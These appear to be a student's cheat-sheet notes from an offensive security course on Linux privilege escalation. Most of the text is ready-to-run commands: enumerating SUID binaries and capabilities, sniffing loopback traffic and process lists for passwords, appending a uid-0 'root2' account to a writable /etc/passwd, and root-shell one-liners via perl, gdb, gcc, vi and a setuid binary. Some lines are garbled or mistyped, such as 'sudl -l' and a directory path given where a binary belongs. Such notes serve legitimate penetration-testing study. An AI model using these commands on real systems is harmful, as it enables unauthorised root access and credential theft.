## Section 1 Enumerating Linux
### 16.1.2 Manual Enumeration
- To find writable directories use 
```
find / -writable -type d 2>/dev/null
```
- To list all mounted filesystems and drives mounted at boot time use
```
cat /etc/fstab
```
- Find firewall rules with 
```
cat /etc/iptables/rules.v4
```
- Get cronjobs with 
```
ls -lah /etc/cron*
```
- View current jobs with 
```
crontab -l
```
- List installed packages with 
```
dpkg -l
```
- View all available disks with
```
lsblk
```
- Enumerate loaded drivers and kernel modules with 
```
lsmod
```
- Find SUID marked binaries with 
```
find / -perm -u=s -type f 2>/dev/null
```
## Section 2 Exposed Confidential Information
### 17.2.1 Inspecting User Trails 
- Check sudo privileges with 
```
sudl -l
```
- The following command takes you directly to the root user
```
sudo -i
```
### 17.2.2 Inspecting Service Footprints 
- Watch processes for any occurrance of the word pass= with
```
watch -n 1 "ps -aux | grep pass"
```
- Capture traffic looking for the word pass with 
```
sudo tcpdump -i lo -A | grep "pass"
```
## Section 3
### 17.3.1 Abusing Cron Jobs 
- Look for running cron jobs with 
```
grep "CRON" /var/log/syslog
```
### 17.3.2 Abusing Password Authentication
- If /etc/passwd is writable use 
```
openssl passwd w00t
```
- THEN
```
echo "root2:OUTPUT:0:0:root:/root:/bin/bash" >> /etc/passwd
```
## Section 4 Insecure System Components 
### 17.4.1 Abusing Setuid Binaries and Capabilities 
- usethe following to find binaries with setuid enabled 
	- What you are looking for is setuid +ep 
```
/usr/sbin/getcap -r / 2>/dev/null
```
- IF the binary was found use the following 
```
/home/<USER>/Desktop -exec "/usr/bin/bash" -p \;
```
- IF the binary was in perl use
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
- To abuse gdb with setuid enabled use 
```
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```
### 17.4.2 Abusing Sudo
- Use gtfobins for everything else 
- from vi or vim you can use the following and maybe get a shell after hitting the esc key 
```
!/bin/sh
```
- Abuse sudo with gcc using
```
gcc -wrapper /bin/sh,-s .
```
### 17.4.3 Exploiting Kernel Vulnerabilities
- Get Linux release with 
```
cat /etc/issue
```
```
uname -r
```
```
arch
```
- Cron jobs can also be found in 
```
/var/log/cron.log
```
## Exercises To-Do

- [ ] 2.1.1 (page 20)